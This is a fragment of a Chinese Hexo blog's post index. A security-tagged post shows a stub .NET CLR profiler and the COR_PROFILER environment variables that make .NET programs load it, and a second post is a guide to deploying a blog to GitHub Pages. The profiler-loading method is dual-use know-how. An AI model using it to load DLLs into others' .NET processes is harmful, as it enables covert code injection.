class=\"params\">(ClassID classID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ClassUnloadFinished</span><span class=\"params\">(ClassID classID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::FunctionUnloadStarted</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITCompilationStarted</span><span class=\"params\">(FunctionID functionID, BOOL fIsSafeToBlock)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITCompilationFinished</span><span class=\"params\">(FunctionID functionID, HRESULT hrStatus, BOOL fIsSafeToBlock)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITCachedFunctionSearchStarted</span><span class=\"params\">(FunctionID functionID, BOOL* pbUseCachedFunction)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITCachedFunctionSearchFinished</span><span class=\"params\">(FunctionID functionID, COR_PRF_JIT_CACHE result)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITFunctionPitched</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::JITInlining</span><span class=\"params\">(FunctionID callerID, FunctionID calleeID, BOOL* pfShouldInline)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::UnmanagedToManagedTransition</span><span class=\"params\">(FunctionID functionID, COR_PRF_TRANSITION_REASON reason)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ManagedToUnmanagedTransition</span><span class=\"params\">(FunctionID functionID, COR_PRF_TRANSITION_REASON reason)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ThreadCreated</span><span class=\"params\">(ThreadID threadID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ThreadDestroyed</span><span class=\"params\">(ThreadID threadID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ThreadAssignedToOSThread</span><span class=\"params\">(ThreadID managedThreadID, DWORD osThreadID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingClientInvocationStarted</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingClientSendingMessage</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingClientReceivingReply</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingClientInvocationFinished</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingServerReceivingMessage</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingServerInvocationStarted</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingServerInvocationReturned</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RemotingServerSendingReply</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeSuspendStarted</span><span class=\"params\">(COR_PRF_SUSPEND_REASON suspendReason)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeSuspendFinished</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeSuspendAborted</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeResumeStarted</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeResumeFinished</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeThreadSuspended</span><span class=\"params\">(ThreadID threadID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RuntimeThreadResumed</span><span class=\"params\">(ThreadID threadID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::MovedReferences</span><span class=\"params\">(ULONG cmovedObjectIDRanges, ObjectID oldObjectIDRangeStart[], ObjectID newObjectIDRangeStart[], ULONG cObjectIDRangeLength[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ObjectAllocated</span><span class=\"params\">(ObjectID objectID, ClassID classID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ObjectsAllocatedByClass</span><span class=\"params\">(ULONG classCount, ClassID classIDs[], ULONG objects[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ObjectReferences</span><span class=\"params\">(ObjectID objectID, ClassID classID, ULONG objectRefs, ObjectID objectRefIDs[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RootReferences</span><span class=\"params\">(ULONG rootRefs, ObjectID rootRefIDs[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionThrown</span><span class=\"params\">(ObjectID thrownObjectID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionUnwindFunctionEnter</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionUnwindFunctionLeave</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionSearchFunctionEnter</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionSearchFunctionLeave</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionSearchFilterEnter</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionSearchFilterLeave</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionSearchCatcherFound</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionCLRCatcherFound</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionCLRCatcherExecute</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionOSHandlerEnter</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionOSHandlerLeave</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionUnwindFinallyEnter</span><span class=\"params\">(FunctionID functionID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionUnwindFinallyLeave</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionCatcherEnter</span><span class=\"params\">(FunctionID functionID,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tObjectID objectID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ExceptionCatcherLeave</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::COMClassicVTableCreated</span><span class=\"params\">(ClassID wrappedClassID, REFGUID implementedIID, <span class=\"keyword\">void</span>* pVTable, ULONG cSlots)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::COMClassicVTableDestroyed</span><span class=\"params\">(ClassID wrappedClassID, REFGUID implementedIID, <span class=\"keyword\">void</span>* pVTable)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ThreadNameChanged</span><span class=\"params\">(ThreadID threadID, ULONG cchName, WCHAR name[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::GarbageCollectionStarted</span><span class=\"params\">(<span class=\"keyword\">int</span> cGenerations, BOOL generationCollected[], COR_PRF_GC_REASON reason)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::SurvivingReferences</span><span class=\"params\">(ULONG cSurvivingObjectIDRanges, ObjectID objectIDRangeStart[], ULONG cObjectIDRangeLength[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::GarbageCollectionFinished</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::FinalizeableObjectQueued</span><span class=\"params\">(DWORD finalizerFlags, ObjectID objectID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::RootReferences2</span><span class=\"params\">(ULONG cRootRefs, ObjectID rootRefIDs[], COR_PRF_GC_ROOT_KIND rootKinds[], COR_PRF_GC_ROOT_FLAGS rootFlags[], UINT_PTR rootIDs[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::HandleCreated</span><span class=\"params\">(GCHandleID handleID, ObjectID initialObjectID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::HandleDestroyed</span><span class=\"params\">(GCHandleID handleID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样简单的探测器就完成了</p>\n<h1 id=\"0x03-测试\"><a href=\"#0x03-测试\" class=\"headerlink\" title=\"0x03 测试\"></a>0x03 测试</h1><p>现在随便创建一个C#程序来进行测试</p>\n<p>想让.Net程序加载探测器，需要设置一些环境变量：</p>\n<blockquote>\n<p>SET COR_ENABLE_PROFILING=1 :: 开启探测器</p>\n<p>SET COR_PROFILER={F62D32FD-6D99-4C9F-B891-A5FCEB01B1CD} :: 探测器注册的GUID</p>\n<p>SET COR_PROFILER_PATH=CLRProfiler.dll ::探测器dll的路径</p>\n<p>SET COMPLUS_ProfAPI_ProfilerCompatibilitySetting=EnableV2Profiler :: .Net Framework 4 兼容2.0的探测器版本</p>\n</blockquote>\n<p>添加以上环境变量通过批处理启动测试程序，发现探测器被成功加载了</p>\n<p><img src=\"Test.png\"></p>\n<p>检测进程模块列表确认</p>\n<p><img src=\"processhacker.png\"></p>\n<p>这里需要用到第四个环境变量因为探测器用的ICorProfilerCallback2，这是.Net Framework 2.0 时提供的API接口，如果被探测的程序位.Net Framework 4以上版本就需要将该环境变量设置来启动兼容性。</p>\n<p>如果有需求可以用高版本的，比如ICorProfilerCallback3，这样就不用加第四个环境变量了，但是在C++代码中必须实现高版本接口新的接口方法。</p>\n<p>注意profiler程序的位数要与.Net程序的位数保持一致，不然就会加载探测器失败，日志记录可以在系统的Event Viewer中查看</p>\n<p><img src=\"EventViewer.png\"></p>\n<p>Visual Studio 2019有个坑爹的地方，在以前版本编译C#程序时，如果PlatForm target选择Any CPU，下面会默认勾选上Prefer 32-bit，但是在最新下的vs2019中直接将这个checkbox给禁用了，在64位系统上就会以64位程序运行。</p>\n<p>Any CPU可以理解为在32位系统上以32位程序运行，在64位系统上以64位程序运行</p>\n<p>Any CPU(Prefer 32-bit)可以理解为在32位系统上以32位程序运行，在64位系统上会模拟作为32位程序程序运行</p>\n<h1 id=\"参考连接\"><a href=\"#参考连接\" class=\"headerlink\" title=\"参考连接\"></a>参考连接</h1><blockquote>\n<p><a href=\"https://dev.to/gabbersepp/create-a-net-profiler-with-the-profiling-api-start-of-an-unexpected-journey-198n\">https://dev.to/gabbersepp/create-a-net-profiler-with-the-profiling-api-start-of-an-unexpected-journey-198n</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]},{"title":"hexo+github搭建博客","url":"/Hexo+github_Build_Blog/","content":"<p>使用Hexo配合NEXT主题搭建个人主页，再上传到Github repository中来对外发布。</p>\n<span id=\"more\"></span>\n\n\n\n<h2 id=\"0x01-安装环境\"><a href=\"#0x01-安装环境\" class=\"headerlink\" title=\"0x01 安装环境\"></a>0x01 安装环境</h2><p>我这里使用的是Ubuntu20.04</p>\n<h3 id=\"Ubuntu安装nodejs\"><a href=\"#Ubuntu安装nodejs\" class=\"headerlink\" title=\"Ubuntu安装nodejs\"></a>Ubuntu安装nodejs</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install nodejs</span><br><span class=\"line\">sudo apt install npm</span><br><span class=\"line\">node --version</span><br><span class=\"line\">npm --version</span><br></pre></td></tr></table></figure>\n\n<p>nodejs的版本低于12就会报错，需要升级nodejs，安装一个node版本切换工具 n</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g n</span><br><span class=\"line\">sudo n stable</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x02-安装Hexo\"><a href=\"#0x02-安装Hexo\" class=\"headerlink\" title=\"0x02 安装Hexo\"></a>0x02 安装Hexo</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Hexo创建博客\"><a href=\"#Hexo创建博客\" class=\"headerlink\" title=\"Hexo创建博客\"></a>Hexo创建博客</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir blog</span><br><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">hexo init <span class=\"comment\"># 初始化创建博客文件</span></span><br><span class=\"line\">hexo clean <span class=\"comment\"># 清除生成的发布目录</span></span><br><span class=\"line\">hexo generate <span class=\"comment\"># 生成发布目录</span></span><br><span class=\"line\">hexo server <span class=\"comment\"># 开启本地服务</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x03-安装NEXT主题\"><a href=\"#0x03-安装NEXT主题\" class=\"headerlink\" title=\"0x03 安装NEXT主题\"></a>0x03 安装NEXT主题</h2><p>在Github项目中<a href=\"https://github.com/theme-next/hexo-theme-next\">NEXT主题</a>是有theme-next来维护的</p>\n<p>在博客根目录下直接用git下载：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>\n\n<p>此时在 Hexo 中有两份主要的配置文件，其名称都是 <code>_config.yml</code>。      其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。在以下说明中，将前者称为<code>站点配置文件</code>，后者称为<code>主题配置文件</code>。    </p>\n<p>打开<code>站点配置文件</code>，找到theme字段，将其改为next：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">theme:</span> <span class=\"string\">next</span></span><br></pre></td></tr></table></figure>\n\n<p>NexT 主题安装完成，启用前使用<code>hexo clean</code> 来清除 Hexo 的缓存，再使用<code>Hexo generate</code>重新生成缓存。</p>\n<h2 id=\"0x04-Gihub发布\"><a href=\"#0x04-Gihub发布\" class=\"headerlink\" title=\"0x04 Gihub发布\"></a>0x04 Gihub发布</h2><h3 id=\"1-Github创建仓库\"><a href=\"#1-Github创建仓库\" class=\"headerlink\" title=\"1 Github创建仓库\"></a>1 Github创建仓库</h3><p>需要创建一个仓库命名为$username.github.io</p>\n<h3 id=\"2-生成Github-Token\"><a href=\"#2-生成Github-Token\" class=\"headerlink\" title=\"2 生成Github Token\"></a>2 生成Github Token</h3><p>在Github的<code>Settings/Developer settings/Personal access tokens</code>中点击右侧的<code>Generate new taken</code>按钮，注意下面还有勾选token的权限范围</p>\n<p><img src=\"1.png\"></p>\n<p>点击下方的<code>Generate token</code>按钮</p>\n<p><img src=\"2.png\"></p>\n<p>token只会显示一次，所以最好将token保存在本地</p>\n<h3 id=\"3-部署网站\"><a href=\"#3-部署网站\" class=\"headerlink\" title=\"3 部署网站\"></a>3 部署网站</h3><p>首先需要修改<code>站点配置文件</code>：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repository:</span> <span class=\"string\">https://token@github.com/username/username.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span 